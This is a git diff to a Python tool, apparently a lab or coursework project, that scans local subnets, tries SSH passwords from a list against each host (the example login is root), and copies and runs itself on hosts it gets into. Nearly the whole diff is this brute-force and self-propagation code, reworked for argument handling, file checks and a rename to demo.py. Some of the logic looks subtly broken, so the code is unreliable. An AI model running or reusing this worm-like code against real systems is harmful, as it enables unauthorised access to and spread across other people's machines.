@@ -1,8 +1,8 @@
 #!/usr/bin/python3
 
+# Import path to check for the existence of files and file paths.
+from os import path
 # Importing paramiko modules for SSH connection and exception handling.
-import pipes
-
 from paramiko import SSHClient, RejectPolicy
 from paramiko.ssh_exception import NoValidConnectionsError, SSHException
 # Importing modules from scapy for Packet Crafting and Sending / Sniffing.
@@ -16,6 +16,8 @@ from scapy.utils import subprocess, os
 from time import sleep
 # Importing logging to safely log sensitive, error or debug info.
 import logging
+# Importing pipes for the piping for certain processes
+import pipes
 # Importing requests for web based operations.
 import requests
 # Importing strings for use of the external strings resources.
@@ -62,8 +64,10 @@ def assigning_values(arguments):
     :return target_ports: The selection of ports to target
     :return target_username: The username that will be used for actions
     :return passwords_filename: The filename of the passwords file
-    :return None: If a runtime error occurs
+    :return None: If an error occurs
     """
+    # Out of scope initialisation for return later.
+    ip_list = None
     if strings.ARGUMENT_IP_ADDRESS_FILENAME in arguments:
         try:
             ip_addresses_filename = \
@@ -72,19 +76,25 @@ def assigning_values(arguments):
         except RuntimeError:
             logging.error(strings.IP_FILENAME_NOT_FOUND)
             return None
-        try:
-            ip_list = convert_file_to_list(ip_addresses_filename)
-            target_ports = arguments[
-                arguments.index(strings.ARGUMENT_PORTS) + 1]
-            target_username = \
-                arguments[arguments.index(strings.ARGUMENT_USERNAME) + 1]
-            passwords_filename = \
-                arguments[arguments.index(strings.ARGUMENT_PWS_FILENAME)
-                          + 1]
-            return ip_list, target_ports, target_username, passwords_filename
-        except RuntimeError:
-            logging.error(strings.ip_list_not_read(ip_addresses_filename))
+        ip_list = convert_file_to_list(ip_addresses_filename)
+        if ip_list is None:
             return None
+    try:
+        target_ports = arguments[
+            arguments.index(strings.ARGUMENT_PORTS) + 1]
+        target_username = \
+            arguments[arguments.index(strings.ARGUMENT_USERNAME) + 1]
+        if path.exists(arguments[arguments.index(
+                strings.ARGUMENT_PWS_FILENAME) + 1]):
+            passwords_filename = arguments[arguments.index(
+                strings.ARGUMENT_PWS_FILENAME) + 1]
+            return ip_list, target_ports, target_username, \
+                passwords_filename
+        logging.error(strings.FILE_DOES_NOT_EXIST)
+        return None
+    except ValueError:
+        logging.error(strings.MISSING_ARGUMENT)
+        return None
 
 
 def check_over_ssh(ip, port, username, password):
@@ -106,16 +116,17 @@ def check_over_ssh(ip, port, username, password):
         client.set_missing_host_key_policy(RejectPolicy)
         client.connect(hostname=str(ip), port=int(port),
                        username=str(username), password=str(password))
-        if strings.touch_file(strings.MAIN_FILENAME) == "touch main.py":
+        if strings.touch_file(strings.DEMO_SCRIPT_FILENAME) == "touch demo.py":
             client.exec_command(pipes.quote(strings.
-                                            touch_file(strings.MAIN_FILENAME)))
+                                            touch_file(strings.
+                                                       DEMO_SCRIPT_FILENAME)))
         else:
             logging.error(strings.SANITATION_FAILED)
             client.close()
             return False
-        if strings.cat_file(strings.MAIN_FILENAME) == "cat main.py":
+        if strings.cat_file(strings.DEMO_SCRIPT_FILENAME) == "cat demo.py":
             if str(client.exec_command(pipes.quote(strings.cat_file(
-                    strings.MAIN_FILENAME)))[1]).__len__() < 1:
+                    strings.DEMO_SCRIPT_FILENAME)))[1]).__len__() < 1:
                 client.close()
                 return True
 
@@ -157,8 +168,11 @@ def checking_arguments(arguments):
             arguments):
         try:
             values = assigning_values(arguments)
-            if values is not None:
+            if values is not None and strings.ARGUMENT_SCAN_LOCAL_NETWORKS \
+                    not in arguments:
                 return values[0], values[1], values[2], values[3]
+            elif strings.ARGUMENT_SCAN_LOCAL_NETWORKS in arguments:
+                return strings.SPACE, values[1], values[2], values[3]
             logging.error(strings.FAILED_ASSIGNING_VALUES)
             return None
         except RuntimeError:
@@ -229,9 +243,13 @@ def convert_file_to_list(filename):
     list
     :return file_as_list: The list of the lines from the file
     """
-    with open(str(filename)) as file:
-        file_as_list = append_lines_from_file_to_list(file)
-    return file_as_list
+    try:
+        with open(filename) as file:
+            file_as_list = append_lines_from_file_to_list(file)
+        return file_as_list
+    except FileNotFoundError:
+        logging.error(strings.FILE_DOES_NOT_EXIST)
+        return None
 
 
 def cycle_through_subnet(ip_list, interface):
@@ -253,7 +271,10 @@ def cycle_through_subnet(ip_list, interface):
         if not ip_list.__contains__(specific_address):
             logging.info(strings.adding_address_to_interface(specific_address,
                                                              interface))
-            ip_list.append(specific_address)
+            if ip_list is not strings.SPACE:
+                ip_list.append(specific_address)
+            else:
+                ip_list = [specific_address]
         last_byte = last_byte + 1
     return ip_list
 
@@ -288,12 +309,12 @@ def gathering_local_ips(ip_list):
     """
     logging.info(strings.FETCHING_LOCAL_INTERFACE_LIST)
     local_interfaces = get_if_list()
-    if strings.LOOPBACK in local_interfaces:
-        local_interfaces = local_interfaces.remove(strings.LOOPBACK)
+    # if strings.LOOPBACK in local_interfaces:
+    #     local_interfaces = local_interfaces.remove(strings.LOOPBACK)
     for interface in local_interfaces:
         if str(interface) != strings.LOOPBACK:
             logging.info(strings.fetching_ips_for_interface(interface))
-            ip_list.extend(cycle_through_subnet(ip_list, interface))
+            ip_list = (cycle_through_subnet(ip_list, interface))
     return ip_list
 
 
@@ -366,7 +387,7 @@ def propagate_script(ip, port, login_string):
                 client.connect(hostname=str(ip), port=int(port),
                                username=str(login_string_split[0]),
                                password=str(login_string_split[1]))
-                if strings.run_script_command() == "./main.py -L -p 22 -u " \
+                if strings.run_script_command() == "./demo.py -L -p 22 -u " \
                                                    "root -f " \
                                                    "src/test_files/" \
                                                    "passwords_list.txt -P":
@@ -641,6 +662,6 @@ def validate_file_exists(filename):
     gracefully
     :param filename: The name of the file we wish to ensure exists
     """
-    if not os.path.isfile(filename):
+    if not path.exists(filename):
         logging.error(strings.FILE_DOES_NOT_EXIST)
         exit_and_show_instructions()
